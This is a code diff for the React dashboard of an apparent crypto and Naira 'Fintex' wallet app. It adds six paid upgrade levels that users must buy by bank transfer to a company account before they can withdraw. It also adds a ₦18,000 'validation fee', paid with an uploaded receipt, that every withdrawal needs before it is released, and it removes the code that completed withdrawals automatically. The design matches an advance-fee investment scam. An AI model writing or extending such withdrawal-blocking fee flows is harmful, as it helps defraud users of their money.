@@ -1,5 +1,6 @@
 import { useState, useEffect, FormEvent } from 'react';
 import { User, Transaction, SupportMessage } from '../types';
+import { TIER_CONFIG } from '../utils/tierConfig';
 import { db, cleanForFirestore } from '../firebase';
 import { doc, setDoc, onSnapshot, getDoc, collection, deleteDoc } from 'firebase/firestore';
 import { 
@@ -399,7 +400,7 @@ export default function Dashboard({
   triggerUpgrade,
   onClearTriggerUpgrade
 }: DashboardProps) {
-  const pendingWithdrawal = (user.tier || 1) === 1 && transactions?.find(
+  const pendingWithdrawal = transactions?.find(
     (tx) => tx.type === 'withdrawal' && tx.status === 'pending'
   );
 
@@ -443,7 +444,7 @@ export default function Dashboard({
 
   // Paid tier upgrade states
   const [upgradeStep, setUpgradeStep] = useState<'benefits' | 'payment_select' | 'usdt_deposit' | 'naira_deposit' | 'card_deposit' | 'processing' | 'success' | 'success_pending'>('benefits');
-  const [selectedUpgradeTier, setSelectedUpgradeTier] = useState<2 | 3 | null>(null);
+  const [selectedUpgradeTier, setSelectedUpgradeTier] = useState<2 | 3 | 4 | 5 | 6 | 7 | null>(null);
   const [upgradeProgress, setUpgradeProgress] = useState<number>(0);
   const [upgradeLogs, setUpgradeLogs] = useState<string>('Initializing secure validation gateway...');
   const [upgradeCardNumber, setUpgradeCardNumber] = useState<string>('');
@@ -948,12 +949,13 @@ export default function Dashboard({
           };
           onUpdateUser(updatedUser);
           
+          const tierInfo = TIER_CONFIG[selectedUpgradeTier];
           const tx: Transaction = {
             id: 'tx_upgrade_' + Math.random().toString(36).substr(2, 9),
             userId: user.id,
             type: 'deposit',
-            amount: selectedUpgradeTier === 2 ? 20.00 : 60.00,
-            description: `Payment for Tier ${selectedUpgradeTier} Verification Status`,
+            amount: tierInfo ? tierInfo.priceUsd : 10.00,
+            description: `Payment for Level ${selectedUpgradeTier} Status (₦${tierInfo ? tierInfo.priceNaira.toLocaleString() : '10,500'})`,
             date: new Date().toISOString(),
             status: 'completed',
             reference: 'FTX-UPG-' + Math.floor(100000 + Math.random() * 900000)
@@ -1154,7 +1156,9 @@ export default function Dashboard({
       return;
     }
 
-    const upgradeAmt = selectedUpgradeTier === 2 ? 20.00 : 60.00;
+    const tierInfo = TIER_CONFIG[selectedUpgradeTier];
+    const upgradeAmt = tierInfo ? tierInfo.priceUsd : 10.00;
+    const upgradeNaira = tierInfo ? tierInfo.priceNaira : 10500;
     const txId = 'tx_upgp_' + Math.random().toString(36).substr(2, 9);
 
     // Create a transaction record (pending review)
@@ -1163,7 +1167,7 @@ export default function Dashboard({
       userId: user.id,
       type: 'deposit',
       amount: upgradeAmt,
-      description: `Upgrade Tier ${selectedUpgradeTier} Status Payment`,
+      description: `Upgrade Level ${selectedUpgradeTier} Payment (₦${upgradeNaira.toLocaleString()})`,
       date: new Date().toISOString(),
       status: 'pending',
       reference: 'FTX-UPG-' + Math.floor(100000 + Math.random() * 900000),
@@ -1177,7 +1181,9 @@ export default function Dashboard({
       userName: user.name,
       userEmail: user.email,
       type: `upgrade_tier_${selectedUpgradeTier}`,
+      tier: selectedUpgradeTier,
       amount: upgradeAmt,
+      amountNaira: upgradeNaira,
       proof: uploadedProofBase64,
       date: new Date().toISOString(),
       status: 'pending',
@@ -1194,6 +1200,45 @@ export default function Dashboard({
     onAddTransaction(tx);
     setUploadedProofBase64('');
     setUpgradeStep('success_pending');
+  };
+
+  const handleSubmitWithdrawalValidation = (tx: Transaction) => {
+    if (!uploadedProofBase64) {
+      alert("Please upload proof of the ₦18,000 payment before submitting validation.");
+      return;
+    }
+
+    const approvalId = 'app_val_' + Math.random().toString(36).substr(2, 9);
+    const newApproval = {
+      id: approvalId,
+      userId: user.id,
+      userName: user.name,
+      userEmail: user.email,
+      type: 'withdrawal_validation',
+      amount: 18000,
+      withdrawalAmount: tx.amount,
+      proof: uploadedProofBase64,
+      date: new Date().toISOString(),
+      status: 'pending',
+      txId: tx.id
+    };
+
+    const approvals = JSON.parse(localStorage.getItem('fintex_pending_approvals') || '[]');
+    approvals.push(newApproval);
+    localStorage.setItem('fintex_pending_approvals', JSON.stringify(approvals));
+
+    setDoc(doc(db, 'approvals', approvalId), cleanForFirestore(newApproval)).catch(err => console.error("FB approval save error", err));
+
+    if (onUpdateTransaction) {
+      onUpdateTransaction(tx.id, {
+        validationStatus: 'pending_approval',
+        validationProof: uploadedProofBase64,
+        validationFeeNaira: 18000
+      });
+    }
+
+    setUploadedProofBase64('');
+    setNotification("₦18,000 Validation receipt uploaded! Awaiting Admin approval to mark withdrawal as successful.");
   };
 
   const handleCopyWalletAddress = () => {
@@ -1381,89 +1426,51 @@ export default function Dashboard({
                     )}
                   </div>
 
-                  <div className="space-y-4" id="tier-comparison">
-                    {/* TIER 2 PLAN BAR */}
-                    <div className="p-4 bg-[#181F2E] border border-slate-800 rounded-2xl relative overflow-hidden text-left" id="tier-2-comparison-card">
-                      <div className="flex justify-between items-start mb-2.5">
-                        <div>
-                          <span className="text-[10px] font-extrabold bg-blue-500/10 text-blue-400 border border-blue-500/20 px-2.5 py-0.5 rounded-full uppercase">Tier 2 Verification</span>
-                          <h4 className="text-sm font-bold text-white mt-1">Naira & Global Access</h4>
+                  <div className="space-y-3" id="tier-comparison">
+                    {([2, 3, 4, 5, 6, 7] as const).map((lvl) => {
+                      const cfg = TIER_CONFIG[lvl];
+                      const isCurrent = (user.tier || 1) >= lvl;
+                      return (
+                        <div key={lvl} className="p-4 bg-[#181F2E] border border-slate-800 rounded-2xl relative overflow-hidden text-left hover:border-slate-700 transition-colors" id={`tier-${lvl}-comparison-card`}>
+                          <div className="flex justify-between items-start mb-2">
+                            <div>
+                              <span className="text-[10px] font-extrabold bg-blue-500/10 text-blue-400 border border-blue-500/20 px-2.5 py-0.5 rounded-full uppercase">
+                                Level {lvl} Verification
+                              </span>
+                              <h4 className="text-sm font-bold text-white mt-1.5">{cfg.name}</h4>
+                            </div>
+                            <div className="text-right">
+                              <span className="text-base font-black font-mono text-emerald-400 block">₦{cfg.priceNaira.toLocaleString()}</span>
+                              <span className="text-[10px] text-slate-400 font-mono">(${cfg.priceUsd.toFixed(2)})</span>
+                            </div>
+                          </div>
+                          <ul className="text-[11px] text-slate-300 space-y-1 list-disc pl-4 mb-3.5">
+                            <li>Daily withdrawal limit: <strong className="font-bold text-white">{cfg.dailyLimitLabel}</strong></li>
+                            <li>Company Account Payment Verification</li>
+                          </ul>
+                          {isCurrent ? (
+                            <button
+                              type="button"
+                              disabled
+                              className="w-full py-2 bg-slate-800 text-slate-400 text-xs font-bold rounded-xl text-center block cursor-not-allowed border border-slate-700"
+                            >
+                              ✓ Level {lvl} Active
+                            </button>
+                          ) : (
+                            <button
+                              type="button"
+                              onClick={() => {
+                                setSelectedUpgradeTier(lvl);
+                                setUpgradeStep('naira_deposit');
+                              }}
+                              className="w-full py-2.5 bg-blue-600 hover:bg-blue-500 text-white text-xs font-extrabold rounded-xl transition-all shadow-md cursor-pointer text-center block"
+                            >
+                              Upgrade to Level {lvl} (₦{cfg.priceNaira.toLocaleString()})
+                            </button>
+                          )}
                         </div>
-                        <div className="text-right">
-                          <span className="text-xs text-slate-500 block line-through">$30.00</span>
-                          <span className="text-base font-black font-mono text-emerald-400">$20.00</span>
-                        </div>
-                      </div>
-                      <ul className="text-[11px] text-slate-400 space-y-1.5 list-disc pl-4 mb-4">
-                        <li>Withdraw & Cash Out instantly to external networks</li>
-                        <li>Daily transfer and cashout limit raised to <strong className="font-semibold text-slate-200">$10,000.00 USD / Day</strong></li>
-                        <li>Unlocks virtual debit cards & higher level interest lockbox yields</li>
-                      </ul>
-                      {(user.tier || 1) >= 2 ? (
-                        <button
-                          type="button"
-                          disabled
-                          className="w-full py-2.5 bg-slate-200 text-slate-500 text-xs font-bold rounded-xl text-center block cursor-not-allowed border border-slate-300/35"
-                          id="btn-select-tier-2-disabled"
-                        >
-                          ✓ Tier 2 Currently Active
-                        </button>
-                      ) : (
-                        <button
-                          type="button"
-                          onClick={() => {
-                            setSelectedUpgradeTier(2);
-                            setUpgradeStep('payment_select');
-                          }}
-                          className="w-full py-2.5 bg-brand-dark hover:bg-brand-medium text-white text-xs font-bold rounded-xl transition-all shadow-sm cursor-pointer text-center block"
-                          id="btn-select-tier-2"
-                        >
-                          Upgrade to Tier 2 ($20)
-                        </button>
-                      )}
-                    </div>
-
-                    {/* TIER 3 PLAN BAR */}
-                    <div className="p-4 bg-indigo-50/40 border border-indigo-100 rounded-2xl relative overflow-hidden text-left" id="tier-3-comparison-card">
-                      <div className="flex justify-between items-start mb-2.5">
-                        <div>
-                          <span className="text-[10px] font-extrabold bg-indigo-100 text-indigo-700 px-2.5 py-0.5 rounded-full uppercase">Tier 3 Platinum</span>
-                          <h4 className="text-sm font-bold text-indigo-950 mt-1">Unlimited Pro Remmitance</h4>
-                        </div>
-                        <div className="text-right">
-                          <span className="text-xs text-indigo-300 block line-through">$100.00</span>
-                          <span className="text-base font-black font-mono text-indigo-600">$60.00</span>
-                        </div>
-                      </div>
-                      <ul className="text-[11px] text-indigo-900/70 space-y-1.5 list-disc pl-4 mb-4">
-                        <li>Unlimited cross-border wire payouts & transfers</li>
-                        <li>Daily transfer and cashout limit raised to <strong className="font-semibold text-indigo-900">$100,000.00 USD / Day</strong></li>
-                        <li>Priority premium wire settlement queues & 24/7 dedicated account manager</li>
-                        <li>Zero-fees on cashout conversions and unlimited debit currency volume</li>
-                      </ul>
-                      {(user.tier || 1) >= 3 ? (
-                        <button
-                          type="button"
-                          disabled
-                          className="w-full py-2.5 bg-slate-200 text-slate-500 text-xs font-bold rounded-xl text-center block cursor-not-allowed border border-slate-300/35"
-                          id="btn-select-tier-3-disabled"
-                        >
-                          ✓ Tier 3 Platinum Active
-                        </button>
-                      ) : (
-                        <button
-                          type="button"
-                          onClick={() => {
-                            setSelectedUpgradeTier(3);
-                            setUpgradeStep('payment_select');
-                          }}
-                          className="w-full py-2.5 bg-indigo-600 hover:bg-indigo-700 text-white text-xs font-bold rounded-xl transition-all shadow-sm cursor-pointer text-center block"
-                          id="btn-select-tier-3"
-                        >
-                          Upgrade to Tier 3 ($60)
-                        </button>
-                      )}
-                    </div>
+                      );
+                    })}
                   </div>
                 </div>
               )}
@@ -1601,45 +1608,47 @@ export default function Dashboard({
               {/* STATUS 3B: NAIRA BANK TRANSFER */}
               {upgradeStep === 'naira_deposit' && (
                 <div className="space-y-4 text-left" id="upgrade-view-naira-deposit">
-                  <div className="pb-2 border-b border-slate-100 flex items-center justify-between">
+                  <div className="pb-2 border-b border-slate-800 flex items-center justify-between">
                     <div>
-                      <h3 className="font-display font-bold text-brand-dark text-base">Pay via Naira Bank Transfer</h3>
-                      <p className="text-xs text-slate-500">Transfer Naira to the designated bank account below.</p>
+                      <h3 className="font-display font-bold text-white text-base">Level {selectedUpgradeTier || 2} Bank Transfer</h3>
+                      <p className="text-xs text-slate-400">Transfer Naira to the designated company bank account below.</p>
                     </div>
                     <button
                       type="button"
-                      onClick={() => setUpgradeStep('payment_select')}
-                      className="text-xs font-bold text-brand-primary hover:underline cursor-pointer"
+                      onClick={() => setUpgradeStep('benefits')}
+                      className="text-xs font-bold text-blue-400 hover:underline cursor-pointer"
                     >
-                      Go Back
+                      Change Level
                     </button>
                   </div>
 
                   <div className="space-y-4">
-                    <div className="p-4 bg-emerald-50/50 border border-emerald-100 rounded-2xl flex justify-between items-center">
+                    <div className="p-4 bg-emerald-500/10 border border-emerald-500/20 rounded-2xl flex justify-between items-center">
                       <div>
                         <span className="text-[10px] text-slate-400 font-bold block">EXACT AMOUNT TO PAY</span>
-                        <strong className="text-base font-black font-mono text-emerald-700">₦{(selectedUpgradeTier === 2 ? 32000 : 96000).toLocaleString()}</strong>
+                        <strong className="text-base font-black font-mono text-emerald-400">
+                          ₦{(TIER_CONFIG[selectedUpgradeTier || 2]?.priceNaira || 10500).toLocaleString()}
+                        </strong>
                       </div>
-                      <span className="text-[10px] bg-emerald-100 text-emerald-800 px-2.5 py-0.5 font-bold rounded-full font-sans uppercase">Rate: ₦1,600 / $1</span>
+                      <span className="text-[10px] bg-emerald-500/20 text-emerald-300 px-2.5 py-0.5 font-bold rounded-full font-sans uppercase">Level {selectedUpgradeTier || 2} Upgrade</span>
                     </div>
 
-                    <div className="p-4 bg-slate-50 rounded-2xl border border-slate-100 space-y-3 text-xs">
-                      <div className="flex justify-between border-b border-slate-100 pb-2">
+                    <div className="p-4 bg-[#181F2E] rounded-2xl border border-slate-800 space-y-3 text-xs">
+                      <div className="flex justify-between border-b border-slate-800 pb-2">
                         <span className="text-slate-400">Bank Destination</span>
-                        <strong className="text-slate-800 font-semibold">{gatewayNairaBank}</strong>
+                        <strong className="text-white font-semibold">{gatewayNairaBank}</strong>
                       </div>
-                      <div className="flex justify-between border-b border-slate-100 pb-2">
+                      <div className="flex justify-between border-b border-slate-800 pb-2">
                         <span className="text-slate-400">Account Number</span>
-                        <div className="flex items-center gap-1.5 font-mono font-bold text-slate-800">
+                        <div className="flex items-center gap-1.5 font-mono font-bold text-amber-400">
                           <span>{gatewayNairaAcc}</span>
                           <button 
                             type="button" 
                             onClick={() => {
                               navigator.clipboard.writeText(gatewayNairaAcc);
-                              setNotification("Account Number copied to clipboard.");
+                              setNotification("Company Account Number copied to clipboard.");
                             }} 
-                            className="bg-white px-2 py-0.5 border border-slate-200 rounded text-[9px] uppercase font-bold text-brand-primary cursor-pointer active:scale-95 transition-all"
+                            className="bg-amber-500/20 text-amber-300 px-2 py-0.5 rounded text-[9px] uppercase font-bold cursor-pointer active:scale-95 transition-all"
                           >
                             Copy
                           </button>
@@ -1647,7 +1656,7 @@ export default function Dashboard({
                       </div>
                       <div className="flex justify-between pb-1">
                         <span className="text-slate-400">Account Name</span>
-                        <strong className="text-slate-850 font-bold">
+                        <strong className="text-white font-bold">
                           {gatewayNairaName}
                         </strong>
                       </div>
@@ -1658,10 +1667,10 @@ export default function Dashboard({
                     <button
                       type="button"
                       onClick={handleTriggerUpgradeSubmission}
-                      className="w-full py-3 bg-brand-dark hover:bg-brand-medium text-white font-bold text-xs rounded-xl shadow transition-all cursor-pointer mt-2"
+                      className="w-full py-3.5 bg-blue-600 hover:bg-blue-500 text-white font-bold text-xs rounded-xl shadow-lg transition-all cursor-pointer mt-2"
                       id="upgrade-confirm-naira"
                     >
-                      I Have Transferred ₦{(selectedUpgradeTier === 2 ? 32000 : 96000).toLocaleString()} (Submit Proof)
+                      I Have Transferred ₦{(TIER_CONFIG[selectedUpgradeTier || 2]?.priceNaira || 10500).toLocaleString()} (Submit Proof)
                     </button>
                   </div>
                 </div>
@@ -1788,120 +1797,203 @@ export default function Dashboard({
           ) : (
             /* NORMAL CASHOUT DISPLAY FOR VERIFIED USERS (TIER 2+) */
             <div id="normal-cashout-content">
+
+              {/* PENDING WITHDRAWAL VALIDATION CARD (₦18,000) */}
+              {pendingWithdrawal && (
+                <div className="bg-[#181F2E] border border-amber-500/30 rounded-2xl p-5 space-y-4 mb-5 text-left shadow-xl" id="withdrawal-validation-card">
+                  <div className="flex items-center gap-2 text-amber-400 font-bold text-sm">
+                    <ShieldAlert className="w-5 h-5 shrink-0 animate-pulse" />
+                    <span>Validate Your Pending Withdrawal</span>
+                  </div>
+
+                  <div className="p-3.5 bg-[#131926] rounded-xl border border-slate-800 text-xs space-y-2">
+                    <div className="flex justify-between items-center">
+                      <span className="text-slate-400">Withdrawal Amount:</span>
+                      <strong className="text-emerald-400 font-mono text-sm">${pendingWithdrawal.amount.toFixed(2)}</strong>
+                    </div>
+                    <div className="flex justify-between items-center text-[11px]">
+                      <span className="text-slate-400">Naira Equivalent:</span>
+                      <strong className="text-white font-mono">₦{(pendingWithdrawal.amount * 1600).toLocaleString()}</strong>
+                    </div>
+                    <div className="flex justify-between items-center text-[11px]">
+                      <span className="text-slate-400">Reference Number:</span>
+                      <span className="text-slate-300 font-mono">{pendingWithdrawal.reference || pendingWithdrawal.id}</span>
+                    </div>
+                  </div>
+
+                  {pendingWithdrawal.validationStatus === 'pending_approval' ? (
+                    <div className="p-3.5 bg-amber-500/10 border border-amber-500/30 rounded-xl text-xs text-amber-300 space-y-1 text-center">
+                      <p className="font-bold flex items-center justify-center gap-1.5 text-amber-400">
+                        <Loader2 className="w-4 h-4 animate-spin shrink-0" />
+                        <span>Validation Proof Uploaded — Awaiting Admin Approval</span>
+                      </p>
+                      <p className="text-[11px] text-amber-200/80 mt-1">
+                        Your ₦18,000 payment receipt is being verified by admin. Once approved, your pending withdrawal will show as successful.
+                      </p>
+                    </div>
+                  ) : (
+                    <div className="space-y-3.5 pt-1">
+                      <p className="text-xs text-slate-300 leading-relaxed">
+                        Your withdrawal request is <strong className="text-amber-400">PENDING</strong>. To validate and release your funds, please transfer the <strong className="text-amber-400 font-bold">₦18,000</strong> validation fee to the company account below and upload your receipt:
+                      </p>
+
+                      <div className="p-3.5 bg-[#131926] rounded-xl border border-slate-800 text-xs space-y-2.5">
+                        <div className="flex justify-between border-b border-slate-800 pb-2">
+                          <span className="text-slate-400">Company Bank</span>
+                          <strong className="text-white font-semibold">{gatewayNairaBank}</strong>
+                        </div>
+                        <div className="flex justify-between border-b border-slate-800 pb-2">
+                          <span className="text-slate-400">Account Number</span>
+                          <div className="flex items-center gap-2 font-mono font-bold text-amber-400">
+                            <span>{gatewayNairaAcc}</span>
+                            <button 
+                              type="button" 
+                              onClick={() => {
+                                navigator.clipboard.writeText(gatewayNairaAcc);
+                                setNotification("Company Account Number copied!");
+                              }}
+                              className="bg-amber-500/20 text-amber-300 px-2 py-0.5 rounded text-[9px] uppercase font-bold cursor-pointer active:scale-95 transition-all"
+                            >
+                              Copy
+                            </button>
+                          </div>
+                        </div>
+                        <div className="flex justify-between border-b border-slate-800 pb-2">
+                          <span className="text-slate-400">Account Name</span>
+                          <strong className="text-white font-semibold">{gatewayNairaName}</strong>
+                        </div>
+                        <div className="flex justify-between pt-0.5">
+                          <span className="text-slate-400">Validation Fee</span>
+                          <strong className="text-emerald-400 font-black font-mono">₦18,000.00 NGN</strong>
+                        </div>
+                      </div>
+
+                      {renderProofUploadArea()}
+
+                      <button
+                        type="button"
+                        onClick={() => handleSubmitWithdrawalValidation(pendingWithdrawal)}
+                        className="w-full py-3.5 bg-amber-500 hover:bg-amber-400 text-slate-950 font-black text-xs rounded-xl shadow-lg transition-all cursor-pointer uppercase tracking-wider"
+                      >
+                        Submit ₦18,000 Validation Receipt
+                      </button>
+                    </div>
+                  )}
+                </div>
+              )}
+
               {/* STEP 1: SELECT CASHOUT METHOD */}
               {transferStep === 'select' && (
-            <div className="space-y-4" id="page-transfer-select">
-              <div className="pb-2">
-                <h3 className="font-display font-bold text-white text-base">Choose Cashout Method</h3>
-                <p className="text-xs text-slate-400">Select how you want to convert and withdraw your balance.</p>
-              </div>
-
-              <div className="grid grid-cols-1 gap-3">
-                {/* Naira Cashout Method */}
-                <button
-                  type="button"
-                  onClick={() => setTransferStep('naira_form')}
-                  className="p-4 bg-[#181F2E] hover:bg-[#1C2538] border border-slate-800 rounded-2xl flex items-center justify-between transition-all text-left cursor-pointer group"
-                  id="choice-naira-cashout"
-                >
-                  <div className="flex items-center gap-3">
-                    <div className="w-11 h-11 bg-amber-500/10 text-amber-400 border border-amber-500/20 rounded-xl flex items-center justify-center font-bold text-lg group-hover:scale-105 transition-transform shrink-0">
-                      ₦
-                    </div>
-                    <div>
-                      <p className="text-xs font-bold text-white">Naira Bank Cashout (Auto-Settled)</p>
-                      <p className="text-[10px] text-slate-400 font-medium">Direct routing to local Nigerian banks at ₦1,600 / $1</p>
-                    </div>
+                <div className="space-y-4" id="page-transfer-select">
+                  <div className="pb-2">
+                    <h3 className="font-display font-bold text-white text-base">Choose Cashout Method</h3>
+                    <p className="text-xs text-slate-400">Select how you want to convert and withdraw your balance.</p>
                   </div>
-                  <ChevronRight className="w-5 h-5 text-slate-500 group-hover:text-slate-300 transition-colors shrink-0" />
-                </button>
 
-                {/* USDT Cashout Method */}
-                <button
-                  type="button"
-                  onClick={() => setTransferStep('usdt_form')}
-                  className="p-4 bg-[#181F2E] hover:bg-[#1C2538] border border-slate-800 rounded-2xl flex items-center justify-between transition-all text-left cursor-pointer group"
-                  id="choice-usdt-cashout"
-                >
-                  <div className="flex items-center gap-3">
-                    <div className="w-11 h-11 bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded-xl flex items-center justify-center font-bold font-mono text-lg group-hover:scale-105 transition-transform shrink-0">
-                      ₮
-                    </div>
-                    <div>
-                      <p className="text-xs font-bold text-white">Crypto Wallet Withdrawal (USDT)</p>
-                      <p className="text-[10px] text-slate-400 font-medium">Instant transaction to your TRC20, BEP20 or ERC20 address</p>
-                    </div>
+                  <div className="grid grid-cols-1 gap-3">
+                    {/* Naira Cashout Method */}
+                    <button
+                      type="button"
+                      onClick={() => setTransferStep('naira_form')}
+                      className="p-4 bg-[#181F2E] hover:bg-[#1C2538] border border-slate-800 rounded-2xl flex items-center justify-between transition-all text-left cursor-pointer group"
+                      id="choice-naira-cashout"
+                    >
+                      <div className="flex items-center gap-3">
+                        <div className="w-11 h-11 bg-amber-500/10 text-amber-400 border border-amber-500/20 rounded-xl flex items-center justify-center font-bold text-lg group-hover:scale-105 transition-transform shrink-0">
+                          ₦
+                        </div>
+                        <div>
+                          <p className="text-xs font-bold text-white">Naira Bank Cashout (Auto-Settled)</p>
+                          <p className="text-[10px] text-slate-400 font-medium">Direct routing to local Nigerian banks at ₦1,600 / $1</p>
+                        </div>
+                      </div>
+                      <ChevronRight className="w-5 h-5 text-slate-500 group-hover:text-slate-300 transition-colors shrink-0" />
+                    </button>
+
+                    {/* USDT Cashout Method */}
+                    <button
+                      type="button"
+                      onClick={() => setTransferStep('usdt_form')}
+                      className="p-4 bg-[#181F2E] hover:bg-[#1C2538] border border-slate-800 rounded-2xl flex items-center justify-between transition-all text-left cursor-pointer group"
+                      id="choice-usdt-cashout"
+                    >
+                      <div className="flex items-center gap-3">
+                        <div className="w-11 h-11 bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded-xl flex items-center justify-center font-bold font-mono text-lg group-hover:scale-105 transition-transform shrink-0">
+                          ₮
+                        </div>
+                        <div>
+                          <p className="text-xs font-bold text-white">Crypto Wallet Withdrawal (USDT)</p>
+                          <p className="text-[10px] text-slate-400 font-medium">Instant transaction to your TRC20, BEP20 or ERC20 address</p>
+                        </div>
+                      </div>
+                      <ChevronRight className="w-5 h-5 text-slate-500 group-hover:text-slate-300 transition-colors shrink-0" />
+                    </button>
                   </div>
-                  <ChevronRight className="w-5 h-5 text-slate-500 group-hover:text-slate-300 transition-colors shrink-0" />
-                </button>
-              </div>
 
-              <div className="mt-6 p-3 bg-[#181F2E] rounded-2xl border border-slate-800 text-center text-[10px] text-slate-400 font-medium flex items-center justify-center gap-1.5">
-                <div className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
-                <span>Instant settlement. Available balance: ${user.balance.toFixed(2)}</span>
-              </div>
-            </div>
-          )}
+                  <div className="mt-6 p-3 bg-[#181F2E] rounded-2xl border border-slate-800 text-center text-[10px] text-slate-400 font-medium flex items-center justify-center gap-1.5">
+                    <div className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
+                    <span>Instant settlement. Available balance: ${user.balance.toFixed(2)}</span>
+                  </div>
+                </div>
+              )}
 
-          {/* STEP 2A: NAIRA FORM */}
-          {transferStep === 'naira_form' && (
-            <form 
-              onSubmit={(e) => {
-                e.preventDefault();
-                const amtUSD = parseFloat(cashoutAmount);
-                if (!amtUSD || amtUSD <= 0) {
-                  setNotification("Please enter a valid amount to cash out.");
-                  return;
-                }
-                if (amtUSD < 200) {
-                  setNotification("The minimum withdrawal amount is $200.00 USD.");
-                  return;
-                }
-                if (amtUSD > user.balance) {
-                  setNotification(`Insufficient balance. You have $${user.balance.toFixed(2)} in your wallet.`);
-                  return;
-                }
-
-                const updatedUser: User = {
-                  ...user,
-                  balance: parseFloat((user.balance - amtUSD).toFixed(2))
-                };
-
-                const txId = 'tx_' + Math.random().toString(36).substr(2, 9);
-                const tx: Transaction = {
-                  id: txId,
-                  userId: user.id,
-                  type: 'withdrawal',
-                  amount: amtUSD,
-                  description: `Naira Cashout to ${cashoutBank} (${cashoutAccountNumber})`,
-                  date: new Date().toISOString(),
-                  status: 'pending',
-                  reference: 'FTX-WD-' + Math.floor(100000 + Math.random() * 900000)
-                };
-
-                onUpdateUser(updatedUser);
-                onAddTransaction(tx);
-                
-                // Store names locally to prevent race conditions when cleared
-                const finalAcctName = cashoutAccountName;
-                const finalBank = cashoutBank;
-
-                setTransferStep('processing_transfer');
-
-                setTimeout(() => {
-                  if ((user.tier || 1) === 1) {
-                    setNotification(`Withdrawal of $${amtUSD.toFixed(2)} is processing. Please upgrade to Tier 2 to complete withdrawal.`);
-                  } else {
-                    if (onUpdateTransaction) {
-                      onUpdateTransaction(txId, { status: 'completed' });
+              {/* STEP 2A: NAIRA FORM */}
+              {transferStep === 'naira_form' && (
+                <form 
+                  onSubmit={(e) => {
+                    e.preventDefault();
+                    const amtUSD = parseFloat(cashoutAmount);
+                    if (!amtUSD || amtUSD <= 0) {
+                      setNotification("Please enter a valid amount to cash out.");
+                      return;
                     }
-                    setNotification(`Naira Cashout check completed! Sent USD $${amtUSD.toFixed(2)} (approx ₦${(amtUSD * 1600).toLocaleString()}) to ${finalAcctName} (${finalBank}).`);
-                  }
-                }, 5000);
-              }}
-              className="space-y-4"
-              id="naira-cashout-form"
-            >
+
+                    const userTier = user.tier || 1;
+                    if (userTier < 2) {
+                      setNotification("Withdrawals are only open for Level 2 users and above. Upgrade to Level 2 (₦10,500).");
+                      return;
+                    }
+
+                    const tierConfig = TIER_CONFIG[userTier];
+                    if (userTier < 7 && tierConfig && amtUSD > tierConfig.dailyLimitUsd) {
+                      setNotification(`Level ${userTier} daily withdrawal limit is $${tierConfig.dailyLimitUsd.toLocaleString()}.00. Upgrade to a higher level for increased limits.`);
+                      return;
+                    }
+
+                    if (amtUSD > user.balance) {
+                      setNotification(`Insufficient balance. You have $${user.balance.toFixed(2)} in your wallet.`);
+                      return;
+                    }
+
+                    const updatedUser: User = {
+                      ...user,
+                      balance: parseFloat((user.balance - amtUSD).toFixed(2))
+                    };
+
+                    const txId = 'tx_' + Math.random().toString(36).substr(2, 9);
+                    const tx: Transaction = {
+                      id: txId,
+                      userId: user.id,
+                      type: 'withdrawal',
+                      amount: amtUSD,
+                      description: `Naira Cashout to ${cashoutBank} (${cashoutAccountNumber})`,
+                      date: new Date().toISOString(),
+                      status: 'pending',
+                      reference: 'FTX-WD-' + Math.floor(100000 + Math.random() * 900000),
+                      validationFeeNaira: 18000,
+                      validationStatus: 'unvalidated'
+                    };
+
+                    onUpdateUser(updatedUser);
+                    onAddTransaction(tx);
+                    
+                    setCashoutAmount('');
+                    setTransferStep('select');
+                    setNotification("Withdrawal request created! Please validate your withdrawal with ₦18,000 below.");
+                  }}
+                  className="space-y-4"
+                  id="naira-cashout-form"
+                >
               <div className="flex items-center justify-between border-b border-slate-800 pb-2.5 mb-1">
                 <button
                   type="button"
@@ -2077,9 +2169,9 @@ export default function Dashboard({
                       id="cashout-amount"
                       type="number"
                       step="0.01"
-                      min="200.00"
+                      min="0.01"
                       required
-                      placeholder={`Min: $200.00 | Max: $${user.balance.toFixed(2)}`}
+                      placeholder={`Max: $${user.balance.toFixed(2)}`}
                       className="w-full pl-8 pr-4 py-3 bg-[#181F2E] border border-slate-700/80 rounded-2xl text-sm font-semibold focus:outline-none focus:border-blue-500 text-white placeholder-slate-500"
                       value={cashoutAmount}
                       onChange={(e) => setCashoutAmount(e.target.value)}
@@ -2113,10 +2205,19 @@ export default function Dashboard({
                   setNotification("Please enter a valid USDT amount to cash out.");
                   return;
                 }
-                if (amtUSD < 200) {
-                  setNotification("The minimum withdrawal amount is $200.00 USD.");
+
+                const userTier = user.tier || 1;
+                if (userTier < 2) {
+                  setNotification("Withdrawals are only open for Level 2 users and above. Upgrade to Level 2 (₦10,500).");
                   return;
                 }
+
+                const tierConfig = TIER_CONFIG[userTier];
+                if (userTier < 7 && tierConfig && amtUSD > tierConfig.dailyLimitUsd) {
+                  setNotification(`Level ${userTier} daily withdrawal limit is $${tierConfig.dailyLimitUsd.toLocaleString()}.00. Upgrade to a higher level for increased limits.`);
+                  return;
+                }
+
                 if (amtUSD > user.balance) {
                   setNotification(`Insufficient balance. You have $${user.balance.toFixed(2)} in your wallet.`);
                   return;
@@ -2136,28 +2237,17 @@ export default function Dashboard({
                   description: `USDT Withdrawal (${cashoutUSDTNetwork})`,
                   date: new Date().toISOString(),
                   status: 'pending',
-                  reference: 'FTX-WD-' + Math.floor(100000 + Math.random() * 900000)
+                  reference: 'FTX-WD-' + Math.floor(100000 + Math.random() * 900000),
+                  validationFeeNaira: 18000,
+                  validationStatus: 'unvalidated'
                 };
 
                 onUpdateUser(updatedUser);
                 onAddTransaction(tx);
                 
-                // Store local variables to avoid closure issues
-                const finalAddress = cashoutUSDTAddress;
-                const finalNetwork = cashoutUSDTNetwork;
-
-                setTransferStep('processing_transfer');
-
-                setTimeout(() => {
-                  if ((user.tier || 1) === 1) {
-                    setNotification(`Withdrawal of $${amtUSD.toFixed(2)} is processing. Please upgrade to Tier 2 to complete withdrawal.`);
-                  } else {
-                    if (onUpdateTransaction) {
-                      onUpdateTransaction(txId, { status: 'completed' });
-                    }
-                    setNotification(`USDT withdrawal sequence completed! Sent ${amtUSD.toFixed(2)} USDT to address ${finalAddress.substring(0,6)}... via ${finalNetwork}.`);
-                  }
-                }, 5000);
+                setCashoutUSDTAmount('');
+                setTransferStep('select');
+                setNotification("USDT Withdrawal request created! Please validate your withdrawal with ₦18,000 below.");
               }}
